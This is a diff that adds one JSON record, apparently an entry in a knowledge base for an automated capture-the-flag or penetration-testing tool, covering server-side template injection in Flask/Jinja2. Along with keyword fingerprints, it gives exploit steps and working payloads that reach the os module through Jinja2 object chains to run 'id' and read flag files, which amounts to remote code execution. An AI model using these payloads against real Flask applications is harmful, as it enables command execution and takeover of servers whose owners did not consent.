@@ -1,0 +1,48 @@
+{
+  "id": "flask-ssti-jinja2",
+  "title": "Flask/Jinja2 Server-Side Template Injection to RCE",
+  "vuln_pattern": "ssti",
+  "fingerprint": [
+    "flask",
+    "jinja2",
+    "werkzeug",
+    "render_template_string",
+    "{{",
+    "template",
+    "注入",
+    "远程代码执行",
+    "命令执行",
+    "代码执行",
+    "getshell",
+    "命令注入",
+    "模板注入",
+    "服务端模板注入",
+    "网站",
+    "应用",
+    "接口",
+    "后台"
+  ],
+  "exploit_steps": [
+    "Confirm SSTI: inject {{7*7}} in a reflected parameter; response shows 49.",
+    "Enumerate: {{config}}, {{self.__init__.__globals__}}.",
+    "Reach os via the object chain to run commands.",
+    "Read the flag file / get a shell."
+  ],
+  "key_payloads": [
+    "{{7*7}}",
+    "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
+    "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag*').read() }}"
+  ],
+  "category": "web",
+  "cve": [],
+  "tags": [
+    "ssti",
+    "jinja2",
+    "rce"
+  ],
+  "source": "seed: general knowledge",
+  "created_ts": 0.0,
+  "preconditions": [],
+  "verify_oracle": "",
+  "pitfalls": []
+}
